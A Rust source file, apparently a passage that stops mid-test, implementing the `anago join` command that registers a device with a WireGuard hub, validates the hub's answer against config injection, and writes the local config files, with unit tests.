//! `anago join <domain> <code>` (DESIGN.md §6.2).
//!
//! The device makes its own keypair, hands the hub the public half, and
//! keeps what comes back. The private key never leaves — it goes
//! straight into the WireGuard config, and not into `device.json`
//! (§9.2).
//!
//! Everything that can be decided without a network is a pure function
//! here: the request body, the device file, the fallback name, and what
//! to say about each way the hub can refuse.

use std::fmt;
use std::path::Path;

use anago_core::code::JoinCode;
use anago_core::json::{self, Value};
use anago_core::name::DeviceName;
use anago_core::proto::{self, ApiError, ErrorCode, JoinRequest, JoinResponse, PATH_JOIN};
use anago_core::state::PrivateKey;
use anago_core::subnet::Subnet;
use anago_core::token::DeviceToken;
use anago_core::wgconf::{self, ClientProfile};

use crate::client::{self, Method, Request};
use crate::fsutil;
use crate::paths::ClientPaths;
use crate::wg::{self, WgError};

/// Schema version of `device.json`.
pub const SCHEMA_VERSION: i64 = 1;

/// What a joined device keeps (§9.2).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DeviceConfig {
    pub domain: String,
    pub name: String,
    pub address: String,
    pub subnet: String,
    /// Bearer token for `ls` and `rm`. The file is 0600 because of it.
    pub token: String,
    pub server_public_key: String,
    pub server_endpoint: String,
    pub server_address: String,
}

impl DeviceConfig {
    /// Built from the hub's answer plus the domain the person typed.
    pub fn from_response(domain: &str, response: JoinResponse) -> DeviceConfig {
        DeviceConfig {
            domain: domain.to_string(),
            name: response.name,
            address: response.address,
            subnet: response.subnet,
            token: response.token,
            server_public_key: response.server_public_key,
            server_endpoint: response.server_endpoint,
            server_address: response.server_address,
        }
    }

    pub fn to_json(&self) -> Value {
        Value::obj([
            ("version", Value::Int(SCHEMA_VERSION)),
            ("domain", Value::str(self.domain.as_str())),
            ("name", Value::str(self.name.as_str())),
            ("address", Value::str(self.address.as_str())),
            ("subnet", Value::str(self.subnet.as_str())),
            ("token", Value::str(self.token.as_str())),
            (
                "server_public_key",
                Value::str(self.server_public_key.as_str()),
            ),
            ("server_endpoint", Value::str(self.server_endpoint.as_str())),
            ("server_address", Value::str(self.server_address.as_str())),
        ])
    }

    pub fn to_json_string(&self) -> String {
        json::to_string_pretty(&self.to_json())
    }

    /// Reads a device file back. `ls` and `rm` are its callers, and
    /// they land in the next slice.
    #[allow(dead_code)]
    pub fn parse(text: &str) -> Result<DeviceConfig, JoinError> {
        let value = json::parse(text).map_err(|e| JoinError::DeviceFile(e.to_string()))?;
        let obj = proto::object(&value).map_err(|e| JoinError::DeviceFile(e.to_string()))?;
        let version = obj
            .get("version")
            .and_then(Value::as_i64)
            .ok_or_else(|| JoinError::DeviceFile("no version".to_string()))?;
        if version != SCHEMA_VERSION {
            return Err(JoinError::DeviceFile(format!(
                "device file is version {version}, this build writes {SCHEMA_VERSION}"
            )));
        }
        let field = |name: &str| -> Result<String, JoinError> {
            proto::string_field(obj, name).map_err(|e| JoinError::DeviceFile(e.to_string()))
        };
        Ok(DeviceConfig {
            domain: field("domain")?,
            name: field("name")?,
            address: field("address")?,
            subnet: field("subnet")?,
            token: field("token")?,
            server_public_key: field("server_public_key")?,
            server_endpoint: field("server_endpoint")?,
            server_address: field("server_address")?,
        })
    }

    /// The wg config this device should run, built from what the hub
    /// said plus the key that never left.
    /// Every field is parsed, not copied. These strings land in a
    /// root-owned config file, and `PublicKey =` or `Endpoint =` with a
    /// newline in it would let a hub write its own `PostUp` line — a
    /// TLS-authenticated hub is still not a trusted compiler.
    pub fn profile(&self, private_key: PrivateKey) -> Result<ClientProfile, JoinError> {
        Ok(ClientProfile {
            address: self.address.parse().map_err(|_| {
                JoinError::BadResponse(format!("{:?} is not an address", self.address))
            })?,
            subnet: Subnet::parse(&self.subnet)
                .map_err(|e| JoinError::BadResponse(format!("subnet: {e}")))?,
            private_key,
            server_public_key: wg::parse_key(&self.server_public_key)
                .map_err(|e| JoinError::BadResponse(format!("server public key: {e}")))?,
            server_endpoint: checked_endpoint(&self.server_endpoint)?,
        })
    }

    /// The hub's private address, parsed. `None` only for a file that
    /// was hand-edited after [`DeviceConfig::validate`] accepted it.
    pub fn server_ip(&self) -> Option<std::net::Ipv4Addr> {
        self.server_address.parse().ok()
    }

    /// Checks the fields that never reach the wg config but do reach
    /// later commands.
    pub fn validate(&self) -> Result<(), JoinError> {
        DeviceName::parse(&self.name).map_err(|e| JoinError::BadResponse(format!("name: {e}")))?;
        DeviceToken::parse(&self.token)
            .map_err(|e| JoinError::BadResponse(format!("token: {e}")))?;
        self.server_address
            .parse::<std::net::Ipv4Addr>()
            .map_err(|_| {
                JoinError::BadResponse(format!(
                    "{:?} is not the server's address",
                    self.server_address
                ))
            })?;
        Ok(())
    }
}

/// Parses `host:port` strictly and gives it back canonical.
///
/// Anything a wg config would read as another directive — a newline, a
/// space, a stray `=` — fails here rather than in a file running as
/// root.
pub fn checked_endpoint(text: &str) -> Result<String, JoinError> {
    let bad = |why: &str| JoinError::BadResponse(format!("server endpoint {text:?}: {why}"));
    let (host, port) = text
        .rsplit_once(':')
        .ok_or_else(|| bad("expected host:port"))?;
    if host.is_empty() {
        return Err(bad("no host"));
    }
    if !host
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '.')
    {
        return Err(bad("the host is not a hostname"));
    }
    let port: u16 = port.parse().map_err(|_| bad("the port is not a number"))?;
    if port == 0 {
        return Err(bad("port 0 is not a port"));
    }
    Ok(format!("{host}:{port}"))
}

/// The body of `POST /api/v1/join`.
pub fn request_body(code: &JoinCode, name: &DeviceName, public_key: &str) -> String {
    json::to_string(
        &JoinRequest {
            code: code.to_string(),
            name: name.to_string(),
            public_key: public_key.to_string(),
        }
        .to_json(),
    )
}

/// Turns a hostname into a device name.
///
/// `MacBook-Pro.local` becomes `macbook-pro`: the first label only,
/// lower-cased, with anything the rules reject replaced by `-`. A name
/// that survives none of that is `None`, and `join` asks for `--name`
/// rather than inventing one.
pub fn name_from_hostname(hostname: &str) -> Option<DeviceName> {
    let label = hostname.split('.').next().unwrap_or_default();
    let cleaned: String = label
        .chars()
        .map(|c| {
            if c.is_alphanumeric() || c == '-' || c == '_' {
                c
            } else {
                '-'
            }
        })
        .collect();
    let trimmed = cleaned.trim_matches(|c: char| c == '-' || c == '_');
    DeviceName::parse(trimmed).ok()
}

/// This machine's hostname.
pub fn hostname() -> Option<String> {
    let mut buffer = [0u8; 256];
    // SAFETY: the buffer is valid for `len` bytes and gethostname
    // writes at most that many, NUL-terminating when it fits.
    let result = unsafe { libc::gethostname(buffer.as_mut_ptr().cast(), buffer.len() - 1) };
    if result != 0 {
        return None;
    }
    let end = buffer.iter().position(|byte| *byte == 0).unwrap_or(0);
    String::from_utf8(buffer[..end].to_vec()).ok()
}

/// What to tell the person when the hub says no.
///
/// The wire carries a machine-readable code (§8); this turns it into
/// the next thing to try.
pub fn explain(status: u16, body: &str) -> String {
    let parsed = json::parse(body)
        .ok()
        .and_then(|value| ApiError::from_json(&value).ok());
    let Some(error) = parsed else {
        return format!("the hub refused the join (HTTP {status}): {}", body.trim());
    };
    let advice = match error.code {
        ErrorCode::InvalidCode => {
            " — codes are single use and expire; run `anago code` on the server for another"
        }
        ErrorCode::NameTaken => " — pick another with --name, or `anago rm` the old device",
        ErrorCode::InvalidName => " — see the name rules in the docs (letters, digits, - and _)",
        ErrorCode::SubnetFull => " — every address is taken; remove a device first",
        ErrorCode::InvalidPublicKey => " — this looks like a bug in anago, not something you did",
        _ => "",
    };
    format!("{}{advice}", error.message)
}

/// What a successful join produced.
///
/// The private key is deliberately not in here: it went into the
/// WireGuard config and there is no reason for another copy to travel
/// back up the call stack.
#[derive(Debug)]
pub struct Joined {
    pub config: DeviceConfig,
}

/// Registers this device with the hub.
///
/// **Human verification needed**: runs `wg genkey`, talks to a real
/// hub, and writes under `/etc/wireguard`.
pub fn run(
    domain: &str,
    code: &JoinCode,
    name: Option<DeviceName>,
    api_port: u16,
    client_paths: &ClientPaths,
    wg_config_path: &Path,
) -> Result<Joined, JoinError> {
    // Everything that can refuse happens before the code is spent: a
    // join that fails after registering leaves the person holding a
    // used code and no tunnel.
    wg::check_tools_from_env().map_err(JoinError::Wg)?;
    let name = match name {
        Some(name) => name,
        None => hostname()
            .as_deref()
            .and_then(name_from_hostname)
            .ok_or(JoinError::NoName)?,
    };
    fsutil::ensure_private_dir(client_paths.dir()).map_err(|e| JoinError::Save {
        what: "the config directory",
        source: e.to_string(),
    })?;
    // Declared before the reservation so it outlives it: the claim is
    // released while this is still held, and only a lock holder ever
    // reclaims a leftover marker.
    let _lock = acquire_join_lock(client_paths)?;
    check_not_joined(client_paths, wg_config_path)?;
    if let Some(parent) = wg_config_path.parent() {
        fsutil::ensure_private_dir(parent).map_err(|e| JoinError::Save {
            what: "the WireGuard directory",
            source: e.to_string(),
        })?;
    }

    // Both files are claimed — empty, 0600, exclusively created —
    // before the hub is asked for anything. Permission problems and
    // races surface here, while the code is still unspent; the writes
    // afterwards go into files this process already owns. The
    // reservation deletes itself unless the join finishes.
    let mut reservation = Reservation::claim(&[wg_config_path, &client_paths.device_file()])?;

    let (private_key, public_key) = wg::generate_keypair().map_err(JoinError::Wg)?;
    let body = request_body(code, &name, &public_key);
    let response = client::send(&Request {
        method: Method::Post,
        host: domain,
        port: api_port,
        path: PATH_JOIN,
        body: Some(&body),
        token: None,
    })
    .map_err(JoinError::Client)?;

    if !response.is_success() {
        // Nothing was registered, so nothing needs undoing.
        return Err(JoinError::Refused(explain(response.status, &response.body)));
    }

    // The hub has now spent the code and registered a peer. Every
    // failure below is a failure *after* that, so they all leave
    // through the same door — one that tries to undo the registration
    // and, failing that, says what to do by hand.
    match finish(
        &response.body,
        domain,
        private_key,
        client_paths,
        wg_config_path,
    ) {
        Ok(config) => {
            reservation.commit();
            Ok(Joined { config })
        }
        Err(e) => Err(post_registration(&response.body, domain, api_port, &e)),
    }
}

/// Everything between a 2xx and a usable device: decode, validate,
/// write.
fn finish(
    body: &str,
    domain: &str,
    private_key: PrivateKey,
    client_paths: &ClientPaths,
    wg_config_path: &Path,
) -> Result<DeviceConfig, JoinError> {
    let value = json::parse(body).map_err(|e| JoinError::BadResponse(e.to_string()))?;
    let answer =
        JoinResponse::from_json(&value).map_err(|e| JoinError::BadResponse(e.to_string()))?;

    let config = DeviceConfig::from_response(domain, answer);
    // Validated before a byte is written: nothing from the hub reaches
    // a root-owned file unparsed.
    config.validate()?;
    let profile = config.profile(private_key)?;

    publish(&config, &profile, client_paths, wg_config_path)?;
    Ok(config)
}

/// Turns a failure that happened after registration into an error that
/// says what state the hub is in.
///
/// The credentials for undoing are read from the raw body, not from the
/// decoded config — the point is to still clean up when it was a *later*
/// field that was unreadable.
fn post_registration(body: &str, domain: &str, api_port: u16, cause: &JoinError) -> JoinError {
    let outcome = match undo_credentials(body) {
        Some((name, token)) => {
            if undo_registration(domain, api_port, &name, &token).is_ok() {
                Undo::Done
            } else {
                Undo::Failed(name.to_string())
            }
        }
        // Not even the name and token were readable, so there is
        // nothing to delete with.
        None => Undo::Unknown,
    };
    JoinError::SavedNothing {
        source: cause.to_string(),
        recovery: recovery_note(outcome),
    }
}

/// Pulls just the two fields an undo needs out of a response body.
///
/// Deliberately not `JoinResponse::from_json`: a body with a good name
/// and token but a malformed endpoint still has everything required to
/// clean up after itself.
pub fn undo_credentials(body: &str) -> Option<(DeviceName, DeviceToken)> {
    let value = json::parse(body).ok()?;
    let name = DeviceName::parse(value.get("name")?.as_str()?).ok()?;
    let token = DeviceToken::parse(value.get("token")?.as_str()?).ok()?;
    Some((name, token))
}

/// How an attempted undo went.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Undo {
    /// The hub was told to forget the device.
    Done,
    /// The hub kept it; the person has to remove it by name.
    Failed(String),
    /// The answer was unreadable enough that even the name is unknown.
    Unknown,
}

/// What to do after a join that registered but could not be saved.
pub fn recovery_note(outcome: Undo) -> String {
    match outcome {
        Undo::Done => "the hub has been told to forget this device, so the same command can be \
             run again once the problem is fixed (the join code, though, is spent — get \
             another with `anago code`)"
            .to_string(),
        Undo::Failed(name) => format!(
            "the hub still lists {name} — remove it there with `anago rm {name}` before \
             retrying, and get a fresh code with `anago code`"
        ),
        Undo::Unknown => "the hub may have registered this device under a name this build \
             could not read — check `anago ls` on the server and `anago rm` it before \
             retrying, with a fresh code from `anago code`"
            .to_string(),
    }
}

/// What a claimed-but-unfinished file contains.
///
/// A marker rather than an empty file, and a comment rather than
/// anything else, so it reads as harmless in the one place it might be
/// seen — `/etc/wireguard/anago.conf`.
pub const CLAIM_MARKER: &str = "# anago: unfinished join — safe to delete\n";

/// Whether a file is a leftover claim rather than a real config.
///
/// `Drop` cleans up when the process gets to run; a Ctrl-C or a kill
/// during the network call does not. Without this, the next `anago
/// join` would find the two files and refuse as if the device had
/// already joined — with nothing to join *to*.
pub fn is_stale_claim(contents: &str) -> bool {
    // The marker and nothing else. An empty file might be one a person
    // made on purpose — `touch /etc/wireguard/anago.conf` to hold the
    // name — and no released build ever left an empty claim, so there
    // is nothing to stay compatible with.
    contents == CLAIM_MARKER
}

/// Files claimed for this attempt, removed if it does not finish.
///
/// Claiming up front turns "the disk is full after the code was spent"
/// into "the disk is full before anything happened", which is a retry
/// rather than a dead end.
#[derive(Debug)]
struct Reservation {
    paths: Vec<std::path::PathBuf>,
    committed: bool,
}

impl Reservation {
    fn claim(paths: &[&Path]) -> Result<Reservation, JoinError> {
        let mut reservation = Reservation {
            paths: Vec::new(),
            committed: false,
        };
        for path in paths {
            claim_one(path)?;
            // Pushed after the claim, so a failure only cleans up what
            // this call actually took.
            reservation.paths.push(path.to_path_buf());
        }
        Ok(reservation)
    }

    fn commit(&mut self) {
        self.committed = true;
    }
}

/// Takes one path: creates it, or takes over a claim an earlier run
/// left behind when it was killed.
fn claim_one(path: &Path) -> Result<(), JoinError> {
    match fsutil::create_new_private(path, CLAIM_MARKER) {
        Ok(()) => Ok(()),
        Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => {
            let existing = std::fs::read_to_string(path).unwrap_or_default();
            if is_stale_claim(&existing) {
                // Ours to reuse: an unfinished join owns nothing.
                fsutil::write_private(path, CLAIM_MARKER).map_err(|e| JoinError::Save {
                    what: "a config file",
                    source: e.to_string(),
                })
            } else {
                Err(JoinError::AlreadyJoined(path.display().to_string()))
            }
        }
        Err(e) => Err(JoinError::Save {
            what: "a config file",
            source: e.to_string(),
        }),
    }
}

impl Drop for Reservation {
    fn drop(&mut self) {
        if self.committed {
            return;
        }
        for path in &self.paths {
            let _ = std::fs::remove_file(path);
        }
    }
}

/// Asks the hub to forget a peer this device could not finish joining.
///
/// Best effort by design: the token is fresh and the peer is one call
/// old, but if this fails too, [`recovery_note`] tells the person what
/// to do by hand.
fn undo_registration(
    domain: &str,
    api_port: u16,
    name: &DeviceName,
    token: &DeviceToken,
) -> Result<(), JoinError> {
    let path = format!(
        "{}/{}",
        proto::PATH_PEERS,
        client::encode_segment(name.as_str())
    );
    let response = client::send(&Request {
        method: Method::Delete,
        host: domain,
        port: api_port,
        path: &path,
        body: None,
        token: Some(token),
    })
    .map_err(JoinError::Client)?;
    if response.is_success() {
        Ok(())
    } else {
        Err(JoinError::Refused(explain(response.status, &response.body)))
    }
}

/// Takes the lock that makes `anago join` single-file on this device.
///
/// Held from before the preflight until after the reservation is
/// released, because both ends matter: without it two joins can each
/// pass the check, and the one that fails would delete the other's
/// freshly written config on the way out.
///
/// Not a wait: a second join on one device is a mistake, not a queue.
pub fn acquire_join_lock(client_paths: &ClientPaths) -> Result<fsutil::FileLock, JoinError> {
    let path = client_paths.join_lock();
    match fsutil::FileLock::try_acquire(&path) {
        Ok(Some(lock)) => Ok(lock),
        Ok(None) => Err(JoinError::AlreadyRunning),
        Err(e) => Err(JoinError::Save {
            what: "the join lock",
            source: e.to_string(),
        }),
    }
}

/// Refuses when this device has already joined something.
///
/// A second join would replace the token and the private key while the
/// hub still lists the old peer — the device would look registered from
/// both sides and work from neither.
pub fn check_not_joined(
    client_paths: &ClientPaths,
    wg_config_path: &Path,
) -> Result<(), JoinError> {
    let device_file = client_paths.device_file();
    if occupied(&device_file) {
        return Err(JoinError::AlreadyJoined(device_file.display().to_string()));
    }
    if occupied(wg_config_path) {
        return Err(JoinError::ConfigExists(
            wg_config_path.display().to_string(),
        ));
    }
    Ok(())
}

/// Whether a path holds something worth protecting — a leftover claim
/// from a killed run does not.
fn occupied(path: &Path) -> bool {
    match std::fs::read_to_string(path) {
        Ok(contents) => !is_stale_claim(&contents),
        // Unreadable but present (a directory, or bytes we cannot
        // decode) is somebody's, not ours.
        Err(_) => path.exists(),
    }
}

/// Fills the reserved files, or leaves neither usable.
///
/// The paths were claimed before the hub was contacted, so these writes
/// replace content this process already owns — no clobbering, and no
/// race with a second `anago join`. If the device file cannot be
/// written, the wg config goes with it: a private key on disk with no
/// token beside it is a state nothing can use and nothing can retry.
fn publish(
    config: &DeviceConfig,
    profile: &ClientProfile,
    client_paths: &ClientPaths,
    wg_config_path: &Path,
) -> Result<(), JoinError> {
    fsutil::write_private(wg_config_path, &wgconf::client_config(profile)).map_err(|e| {
        JoinError::Save {
            what: "the WireGuard config",
            source: e.to_string(),
        }
    })?;

    let device_file = client_paths.device_file();
    if let Err(e) = fsutil::write_private(&device_file, &config.to_json_string()) {
        let _ = std::fs::remove_file(wg_config_path);
        return Err(JoinError::Save {
            what: "the device file",
            source: e.to_string(),
        });
    }
    Ok(())
}

/// Why a join did not finish.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum JoinError {
    /// The WireGuard tools are missing or failed.
    Wg(WgError),
    /// No `--name` and no usable hostname.
    NoName,
    /// The call did not happen.
    Client(client::ClientError),
    /// The hub answered, and said no.
    Refused(String),
    /// The hub answered with something this build cannot read — or
    /// something anago will not put in a config file.
    BadResponse(String),
    /// This device has already joined a network.
    AlreadyJoined(String),
    /// Another `anago join` is working on this device right now.
    AlreadyRunning,
    /// A WireGuard config with anago's name is already there.
    ConfigExists(String),
    /// A file could not be written.
    Save { what: &'static str, source: String },
    /// The hub registered this device and the local files could not be
    /// saved — the one failure that leaves the two sides disagreeing.
    SavedNothing { source: String, recovery: String },
    /// An existing `device.json` could not be read — raised by
    /// [`DeviceConfig::parse`], whose callers land with `ls`/`rm`.
    #[allow(dead_code)]
    DeviceFile(String),
}

impl fmt::Display for JoinError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            JoinError::Wg(e) => write!(f, "{e}"),
            JoinError::NoName => write!(
                f,
                "this machine's hostname is not a usable device name — pass --name"
            ),
            JoinError::Client(e) => write!(f, "{e}"),
            JoinError::Refused(detail) => write!(f, "{detail}"),
            JoinError::BadResponse(detail) => {
                write!(f, "the hub's answer made no sense: {detail}")
            }
            JoinError::AlreadyRunning => write!(
                f,
                "another `anago join` is already running on this device — \
                 let it finish, or wait for it to fail"
            ),
            JoinError::AlreadyJoined(path) => write!(
                f,
                "this device has already joined a network — {path} exists. \
                 Remove it, and `anago rm` this device on the server, to join again"
            ),
            JoinError::ConfigExists(path) => write!(
                f,
                "{path} already exists — anago will not replace a WireGuard config \
                 it did not write. Move it aside first"
            ),
            JoinError::Save { what, source } => write!(f, "could not write {what}: {source}"),
            JoinError::SavedNothing { source, recovery } => write!(
                f,
                "the hub registered this device but nothing could be saved locally \
                 ({source}) — {recovery}"
            ),
            JoinError::DeviceFile(detail) => write!(f, "device file: {detail}"),
        }
    }
}

impl std::error::Error for JoinError {}

#[cfg(test)]
mod tests {
    use super::*;

    fn response() -> JoinResponse {
        JoinResponse {
            name: "macbook".to_string(),
            address: "10.100.0.2".to_string(),
            subnet: "10.100.0.0/24".to_string(),
            token: "ab".repeat(32),
            server_public_key: "Xtt7u1I5qnMB8k6yMkjTDpJAc+3tPLPV9dg/yeb+qdE=".to_string(),
            server_endpoint: "net.example.com:51820".to_string(),
            server_address: "10.100.0.1".to_string(),
        }
    }

    fn config() -> DeviceConfig {
        DeviceConfig::from_response("net.example.com", response())
    }

    #[test]
    fn the_device_file_keeps_what_later_commands_need() {
        let config = config();
        assert_eq!(config.domain, "net.example.com");
        // The normalized name, so `anago rm` can use it as typed here.
        assert_eq!(config.name, "macbook");
        assert_eq!(config.address, "10.100.0.2");
        assert_eq!(config.token, "ab".repeat(32));

        let text = config.to_json_string();
        assert_eq!(DeviceConfig::parse(&text).unwrap(), config);
        // §9.2 pins these names.
        assert!(text.contains("\"version\": 1"), "{text}");
        assert!(
            text.contains("\"server_endpoint\": \"net.example.com:51820\""),
            "{text}"
        );
    }

    #[test]
    fn the_hubs_address_comes_back_typed() {
        assert_eq!(config().server_ip().unwrap().to_string(), "10.100.0.1");
        let mut broken = config();
        broken.server_address = "10.100.0.999".to_string();
        assert_eq!(broken.server_ip(), None);
    }

    #[test]
    fn the_private_key_is_not_in_the_device_file() {
        // §6.2: it never leaves the machine, and §9.2 keeps it out of
        // this file — it lives in the wg config alone.
        let text = config().to_json_string();
        assert!(!text.contains("private"), "{text}");
        assert!(!text.contains("PrivateKey"), "{text}");
    }

    #[test]
    fn a_device_file_from_another_version_is_refused() {
        let text = config()
            .to_json_string()
            .replace("\"version\": 1", "\"version\": 2");
        let e = DeviceConfig::parse(&text).unwrap_err();
        assert!(e.to_string().contains("version 2"), "{e}");

        assert!(DeviceConfig::parse("{}").is_err());
        assert!(DeviceConfig::parse("not json").is_err());
        let missing = config().to_json_string().replace("\"token\"", "\"tokenn\"");
        assert!(DeviceConfig::parse(&missing)
            .unwrap_err()
            .to_string()
            .contains("token"));
    }

    #[test]
    fn the_request_body_is_what_the_hub_expects() {
        let body = request_body(
            &JoinCode::parse("7QX4-M2KD").unwrap(),
            &DeviceName::parse("맥북").unwrap(),
            "Xtt7u1I5qnMB8k6yMkjTDpJAc+3tPLPV9dg/yeb+qdE=",
        );
        assert_eq!(
            body,
            r#"{"code":"7QX4-M2KD","name":"맥북","public_key":"Xtt7u1I5qnMB8k6yMkjTDpJAc+3tPLPV9dg/yeb+qdE="}"#
        );
        // And the hub can read it back.
        assert_eq!(
            JoinRequest::from_json(&json::parse(&body).unwrap())
                .unwrap()
                .name,
            "맥북"
        );
    }

    #[test]
    fn a_hostname_becomes_a_usable_name() {
        assert_eq!(
            name_from_hostname("MacBook-Pro.local").unwrap().as_str(),
            "macbook-pro"
        );
        assert_eq!(name_from_hostname("vps1").unwrap().as_str(), "vps1");
        assert_eq!(name_from_hostname("my mac").unwrap().as_str(), "my-mac");
        assert_eq!(
            name_from_hostname("desktop.lan").unwrap().as_str(),
            "desktop"
        );
        // Reserved and empty names are not invented around.
        assert_eq!(name_from_hostname("server"), None);
        assert_eq!(name_from_hostname(""), None);
        assert_eq!(name_from_hostname("..."), None);
        assert_eq!(name_from_hostname("---"), None);
    }

    #[test]
    fn each_refusal_says_what_to_do_next() {
        let body = |code: ErrorCode, message: &str| {
            json::to_string(&ApiError::new(code, message).to_json())
        };

        let text = explain(
            403,
            &body(ErrorCode::InvalidCode, "that join code is not valid"),
        );
        assert!(text.contains("that join code is not valid"), "{text}");
        assert!(text.contains("`anago code` on the server"), "{text}");

        let text = explain(409, &body(ErrorCode::NameTaken, "already registered"));
        assert!(text.contains("--name"), "{text}");

        let text = explain(507, &body(ErrorCode::SubnetFull, "no free address"));
        assert!(text.contains("remove a device first"), "{text}");

        // A body that is not one of ours still reaches the person.
        let text = explain(502, "<html>bad gateway</html>");
        assert!(text.contains("HTTP 502"), "{text}");
        assert!(text.contains("bad gateway"), "{text}");
    }

    #[test]
    fn the_profile_carries_the_key_the_hub_never_saw() {
        let profile = config()
            .profile(PrivateKey::new("ZGV2aWNlIHByaXZhdGU="))
            .unwrap();
        assert_eq!(profile.address.to_string(), "10.100.0.2");
        assert_eq!(profile.subnet.to_string(), "10.100.0.0/24");
        assert_eq!(profile.server_endpoint, "net.example.com:51820");

        let text = wgconf::client_config(&profile);
        assert!(text.contains("PrivateKey = ZGV2aWNlIHByaXZhdGU="), "{text}");
        assert!(text.contains("AllowedIPs = 10.100.0.0/24"), "{text}");
    }

    #[test]
    fn a_nonsense_address_or_subnet_is_caught_before_a_config_is_written() {
        let mut config = config();
        config.address = "not an address".to_string();
        assert!(matches!(
            config.profile(PrivateKey::new("k")),
            Err(JoinError::BadResponse(_))
        ));

        let mut config = super::tests::config();
        config.subnet = "10.100.0.0/16".to_string();
        let e = config.profile(PrivateKey::new("k")).unwrap_err();
        assert!(e.to_string().contains("/24 only"), "{e}");
    }

    // ----------------------------------------------- local publication

    struct TempDirs {
        root: std::path::PathBuf,
        client: ClientPaths,
        wg_config: std::path::PathBuf,
    }

    impl TempDirs {
        fn new() -> TempDirs {
            use std::sync::atomic::{AtomicU32, Ordering};
            static COUNTER: AtomicU32 = AtomicU32::new(0);
            let unique = COUNTER.fetch_add(1, Ordering::Relaxed);
            let root =
                std::env::temp_dir().join(format!("anago-join-{}-{unique}", std::process::id()));
            let client = ClientPaths::new(root.join("config"));
            std::fs::create_dir_all(client.dir()).unwrap();
            std::fs::create_dir_all(root.join("wireguard")).unwrap();
            TempDirs {
                wg_config: root.join("wireguard").join("anago.conf"),
                client,
                root,
            }
        }
    }

    impl Drop for TempDirs {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.root);
        }
    }

    fn profile_of(config: &DeviceConfig) -> ClientProfile {
        config
            .profile(PrivateKey::new("ZGV2aWNlIHByaXZhdGU="))
            .unwrap()
    }

    #[test]
    fn a_device_that_already_joined_is_not_quietly_re_joined() {
        // Rejoining would replace the token and the key while the hub
        // still lists the old peer — registered on both sides, working
        // on neither.
        let dirs = TempDirs::new();
        assert!(check_not_joined(&dirs.client, &dirs.wg_config).is_ok());

        std::fs::write(dirs.client.device_file(), "{}").unwrap();
        let e = check_not_joined(&dirs.client, &dirs.wg_config).unwrap_err();
        assert!(matches!(e, JoinError::AlreadyJoined(_)), "{e:?}");
        assert!(e.to_string().contains("anago rm"), "{e}");

        // And a wg config anago did not write is not ours to replace.
        std::fs::remove_file(dirs.client.device_file()).unwrap();
        std::fs::write(&dirs.wg_config, "[Interface]\n").unwrap();
        let e = check_not_joined(&dirs.client, &dirs.wg_config).unwrap_err();
        assert!(matches!(e, JoinError::ConfigExists(_)), "{e:?}");
    }

    #[test]
    fn publishing_writes_both_files_or_neither() {
        let dirs = TempDirs::new();
        let config = config();
        publish(&config, &profile_of(&config), &dirs.client, &dirs.wg_config).unwrap();

        assert_eq!(
            DeviceConfig::parse(&std::fs::read_to_string(dirs.client.device_file()).unwrap())
                .unwrap(),
            config
        );
        assert!(std::fs::read_to_string(&dirs.wg_config)
            .unwrap()
            .contains("PrivateKey = ZGV2aWNlIHByaXZhdGU="));
    }

    #[test]
    fn a_failed_device_file_takes_the_wg_config_with_it() {
        // A private key on disk with no token beside it is a state
        // nothing can use and nothing can retry.
        let dirs = TempDirs::new();
        // A directory where the device file goes: the write fails after
        // the wg config succeeded.
        std::fs::create_dir_all(dirs.client.device_file()).unwrap();

        let config = config();
        let e = publish(&config, &profile_of(&config), &dirs.client, &dirs.wg_config).unwrap_err();
        assert!(
            matches!(e, JoinError::Save { .. } | JoinError::AlreadyJoined(_)),
            "{e:?}"
        );
        assert!(
            !dirs.wg_config.exists(),
            "the wg config must be rolled back so a retry is possible"
        );
    }

    #[test]
    fn a_reservation_claims_names_and_gives_them_back_if_the_join_fails() {
        // Claiming before the POST is what turns "the disk is full
        // after the code was spent" into a plain retry.
        let dirs = TempDirs::new();
        let device_file = dirs.client.device_file();
        {
            let _claim = Reservation::claim(&[&dirs.wg_config, &device_file]).unwrap();
            assert!(dirs.wg_config.exists() && device_file.exists());
        }
        // Dropped without commit: nothing left behind, so the next
        // attempt starts clean.
        assert!(
            !dirs.wg_config.exists(),
            "the claim should have been released"
        );
        assert!(!device_file.exists());

        let mut claim = Reservation::claim(&[&dirs.wg_config]).unwrap();
        claim.commit();
        drop(claim);
        assert!(dirs.wg_config.exists(), "a committed claim stays");
    }

    #[test]
    fn a_name_somebody_else_took_is_not_claimed() {
        let dirs = TempDirs::new();
        std::fs::write(&dirs.wg_config, "someone else's interface\n").unwrap();

        let device_file = dirs.client.device_file();
        let e = Reservation::claim(&[&dirs.wg_config, &device_file]).unwrap_err();
        assert!(matches!(e, JoinError::AlreadyJoined(_)), "{e:?}");
        assert_eq!(
            std::fs::read_to_string(&dirs.wg_config).unwrap(),
            "someone else's interface\n",
            "the existing file is untouched"
        );
        assert!(!device_file.exists(), "and nothing after it was claimed");
    }

    #[test]
    fn a_registration_that_cannot_be_saved_says_how_to_recover() {
        // The one case where the two sides disagree: the hub spent the
        // code and holds a peer this device cannot use.
        let undone = recovery_note(Undo::Done);
        assert!(undone.contains("forget this device"), "{undone}");
        assert!(undone.contains("`anago code`"), "{undone}");
        assert!(
            !undone.contains("anago rm"),
            "nothing left to remove: {undone}"
        );

        let stuck = recovery_note(Undo::Failed("macbook".to_string()));
        assert!(stuck.contains("anago rm macbook"), "{stuck}");
        assert!(stuck.contains("`anago code`"), "{stuck}");

        // Not even a name to remove: say that, rather than nothing.
        let unknown = recovery_note(Undo::Unknown);
        assert!(unknown.contains("may have registered"), "{unknown}");
        assert!(unknown.contains("anago ls"), "{unknown}");

        let e = JoinError::SavedNothing {
            source: "No space left on device".to_string(),
            recovery: stuck,
        };
        let message = e.to_string();
        assert!(message.contains("registered this device"), "{message}");
        assert!(message.contains("No space left on device"), "{message}");
        assert!(message.contains("anago rm macbook"), "{message}");
    }

    #[test]
    fn an_undo_is_possible_even_when_a_later_field_is_unreadable() {
        // Regression: a good token and name with a malformed endpoint
        // used to return straight out as BadResponse, leaving the hub
        // holding a peer while the credentials to remove it were right
        // there in the body.
        let good = json::to_string(&response().to_json());
        let (name, token) = undo_credentials(&good).expect("a full answer");
